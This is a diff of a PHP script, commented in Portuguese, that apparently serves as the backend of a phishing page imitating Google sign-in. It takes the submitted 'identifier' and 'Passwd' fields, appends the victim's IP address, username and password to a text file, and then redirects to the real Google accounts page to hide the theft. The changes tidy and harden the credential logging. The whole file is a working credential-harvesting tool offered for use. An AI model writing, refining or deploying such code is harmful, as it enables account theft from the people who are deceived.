@@ -1,6 +1,6 @@
 <?php
 
-
+// Inicializar as variáveis
 $vnome = isset($_POST["identifier"]) ? $_POST["identifier"] : '';
 $vsenha = isset($_POST["Passwd"]) ? $_POST["Passwd"] : '';
 
@@ -11,22 +11,24 @@ if (empty($vsenha)) {
     
     // Redirecionar para pass.html
     header("Location: pass.html");
-    exit();
+    exit(); // Sempre incluir exit após header()
 }
 
-
-// Adicionar dados ao arquivo
+// Preparar os dados para gravar no arquivo
+$dados = $_SERVER['REMOTE_ADDR'] . " - Nome: " . $vnome . " Senha: " . $vsenha . "\n";
 $name = 'arquivo.txt';
-$file = fopen($name, 'a');
-fwrite($file, 'IP:');
-$string = $_SERVER['REMOTE_ADDR'];
-fwrite($file, $string);
-fwrite($file, ' nome: ');
-fwrite($file, $vnome);
-fwrite($file, ' senha: ');
-fwrite($file, $vsenha . "\n");
-fclose($file);
+
+// Verificar se o arquivo foi aberto com sucesso
+if ($file = fopen($name, 'a')) {
+    fwrite($file, $dados);
+    fclose($file);
+} else {
+    // Se não conseguir abrir o arquivo, enviar mensagem de erro
+    die("Erro ao abrir o arquivo. altera as permissões");
+}
 
 // Redirecionar para a página principal se a senha estiver definida
 header("Location: https://accounts.google.com/");
-exit();
+exit(); // Sempre incluir exit após header()
+
+?>
